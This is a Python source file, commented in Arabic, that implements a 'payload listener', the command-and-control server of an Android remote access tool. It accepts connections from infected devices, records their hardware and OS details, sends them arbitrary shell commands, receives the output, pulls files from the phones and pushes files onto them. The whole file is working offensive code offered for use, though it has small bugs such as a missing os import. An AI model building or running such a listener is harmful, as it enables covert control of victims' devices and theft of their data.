#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
خادم الاستماع للبايلودات
Payload Listener Server
"""

import socket
import threading
import time
import json
import base64
from datetime import datetime
from utils.logger import Logger
from utils.helpers import get_local_ip

class Listener:
    """كلاس خادم الاستماع"""
    
    def __init__(self):
        self.logger = Logger()
        self.server_socket = None
        self.running = False
        self.connections = {}
        self.threads = []
        
    def start(self, host, port, session_manager):
        """بدء خادم الاستماع"""
        try:
            self.logger.info(f"بدء الاستماع على {host}:{port}")
            
            # إنشاء socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            
            self.running = True
            
            print(f"🚀 خادم الاستماع يعمل على {host}:{port}")
            print("⏳ في انتظار الاتصالات...")
            print("اضغط Ctrl+C للإيقاف")
            
            # حلقة قبول الاتصالات
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    self.logger.info(f"اتصال جديد من {client_address}")
                    
                    # إنشاء جلسة جديدة
                    session_id = self.generate_session_id()
                    session = {
                        'id': session_id,
                        'socket': client_socket,
                        'address': client_address,
                        'ip': client_address[0],
                        'port': client_address[1],
                        'connected_at': datetime.now().isoformat(),
                        'status': 'connected',
                        'last_activity': datetime.now().isoformat()
                    }
                    
                    # إضافة الجلسة إلى مدير الجلسات
                    session_manager.add_session(session)
                    self.connections[session_id] = session
                    
                    # بدء thread للتعامل مع الجلسة
                    thread = threading.Thread(
                        target=self.handle_client,
                        args=(session, session_manager)
                    )
                    thread.daemon = True
                    thread.start()
                    self.threads.append(thread)
                    
                except socket.error as e:
                    if self.running:
                        self.logger.error(f"خطأ في قبول الاتصال: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"خطأ في بدء الاستماع: {e}")
            raise
        finally:
            self.stop()
    
    def handle_client(self, session, session_manager):
        """التعامل مع العميل المتصل"""
        try:
            client_socket = session['socket']
            session_id = session['id']
            
            print(f"✅ جلسة جديدة: {session_id} من {session['ip']}:{session['port']}")
            
            # إرسال رسالة ترحيب
            self.send_message(client_socket, "مرحباً! تم الاتصال بنجاح")
            
            # حلقة استقبال الأوامر
            while self.running and session['status'] == 'connected':
                try:
                    # استقبال البيانات
                    data = client_socket.recv(4096).decode('utf-8')
                    
                    if not data:
                        break
                    
                    # تحديث آخر نشاط
                    session['last_activity'] = datetime.now().isoformat()
                    session_manager.update_session(session_id, session)
                    
                    # معالجة البيانات المستلمة
                    self.process_received_data(session, data)
                    
                except socket.timeout:
                    continue
                except socket.error as e:
                    self.logger.error(f"خطأ في استقبال البيانات: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"خطأ في التعامل مع العميل: {e}")
        finally:
            # إغلاق الجلسة
            self.close_session(session_id, session_manager)
    
    def process_received_data(self, session, data):
        """معالجة البيانات المستلمة"""
        try:
            # محاولة تحليل JSON
            try:
                message = json.loads(data)
                message_type = message.get('type', 'unknown')
                
                if message_type == 'device_info':
                    self.handle_device_info(session, message)
                elif message_type == 'command_result':
                    self.handle_command_result(session, message)
                elif message_type == 'file_data':
                    self.handle_file_data(session, message)
                else:
                    print(f"📨 رسالة من {session['id']}: {data}")
                    
            except json.JSONDecodeError:
                # إذا لم تكن JSON، اعتبارها نص عادي
                print(f"📨 رسالة من {session['id']}: {data}")
                
        except Exception as e:
            self.logger.error(f"خطأ في معالجة البيانات: {e}")
    
    def handle_device_info(self, session, message):
        """معالجة معلومات الجهاز"""
        device_info = message.get('data', {})
        session['device_info'] = device_info
        
        print(f"\n📱 معلومات الجهاز ({session['id']}):")
        print(f"   النموذج: {device_info.get('model', 'غير معروف')}")
        print(f"   الأندرويد: {device_info.get('android_version', 'غير معروف')}")
        print(f"   SDK: {device_info.get('sdk_version', 'غير معروف')}")
        print(f"   المعمارية: {device_info.get('architecture', 'غير معروف')}")
        print(f"   الذاكرة: {device_info.get('ram', 'غير معروف')} MB")
    
    def handle_command_result(self, session, message):
        """معالجة نتيجة الأمر"""
        command = message.get('command', '')
        result = message.get('result', '')
        
        print(f"\n💻 نتيجة الأمر من {session['id']}:")
        print(f"   الأمر: {command}")
        print(f"   النتيجة:\n{result}")
    
    def handle_file_data(self, session, message):
        """معالجة بيانات الملف"""
        filename = message.get('filename', 'unknown')
        file_data = message.get('data', '')
        
        # حفظ الملف
        output_path = f"sessions/{session['id']}_{filename}"
        with open(output_path, 'wb') as f:
            f.write(base64.b64decode(file_data))
        
        print(f"📁 تم حفظ الملف: {output_path}")
    
    def send_message(self, client_socket, message):
        """إرسال رسالة للعميل"""
        try:
            if isinstance(message, str):
                message = message.encode('utf-8')
            client_socket.send(message + b'\n')
        except Exception as e:
            self.logger.error(f"خطأ في إرسال الرسالة: {e}")
    
    def send_command(self, session_id, command):
        """إرسال أمر للجلسة"""
        try:
            if session_id in self.connections:
                session = self.connections[session_id]
                client_socket = session['socket']
                
                # إرسال الأمر
                command_data = {
                    'type': 'command',
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.send_message(client_socket, json.dumps(command_data))
                self.logger.info(f"تم إرسال الأمر '{command}' للجلسة {session_id}")
                return True
            else:
                self.logger.error(f"الجلسة {session_id} غير موجودة")
                return False
                
        except Exception as e:
            self.logger.error(f"خطأ في إرسال الأمر: {e}")
            return False
    
    def send_file(self, session_id, file_path):
        """إرسال ملف للجلسة"""
        try:
            if session_id in self.connections:
                session = self.connections[session_id]
                client_socket = session['socket']
                
                # قراءة الملف
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # إرسال بيانات الملف
                file_message = {
                    'type': 'file_upload',
                    'filename': os.path.basename(file_path),
                    'data': base64.b64encode(file_data).decode('utf-8'),
                    'timestamp': datetime.now().isoformat()
                }
                
                self.send_message(client_socket, json.dumps(file_message))
                self.logger.info(f"تم إرسال الملف '{file_path}' للجلسة {session_id}")
                return True
            else:
                self.logger.error(f"الجلسة {session_id} غير موجودة")
                return False
                
        except Exception as e:
            self.logger.error(f"خطأ في إرسال الملف: {e}")
            return False
    
    def close_session(self, session_id, session_manager):
        """إغلاق الجلسة"""
        try:
            if session_id in self.connections:
                session = self.connections[session_id]
                session['status'] = 'disconnected'
                session['disconnected_at'] = datetime.now().isoformat()
                
                # إغلاق socket
                if session['socket']:
                    session['socket'].close()
                
                # تحديث مدير الجلسات
                session_manager.update_session(session_id, session)
                
                # إزالة من قائمة الاتصالات
                del self.connections[session_id]
                
                print(f"❌ تم إغلاق الجلسة: {session_id}")
                self.logger.info(f"تم إغلاق الجلسة: {session_id}")
                
        except Exception as e:
            self.logger.error(f"خطأ في إغلاق الجلسة: {e}")
    
    def stop(self):
        """إيقاف خادم الاستماع"""
        try:
            self.running = False
            
            # إغلاق جميع الجلسات
            for session_id in list(self.connections.keys()):
                self.close_session(session_id, None)
            
            # إغلاق socket الخادم
            if self.server_socket:
                self.server_socket.close()
            
            # انتظار انتهاء الـ threads
            for thread in self.threads:
                thread.join(timeout=1)
            
            self.logger.info("تم إيقاف خادم الاستماع")
            
        except Exception as e:
            self.logger.error(f"خطأ في إيقاف الاستماع: {e}")
    
    def generate_session_id(self):
        """توليد معرف فريد للجلسة"""
        import uuid
        return str(uuid.uuid4())[:8]
    
    def get_active_sessions(self):
        """الحصول على الجلسات النشطة"""
        return list(self.connections.keys())
    
    def get_session_info(self, session_id):
        """الحصول على معلومات الجلسة"""
        return self.connections.get(session_id)
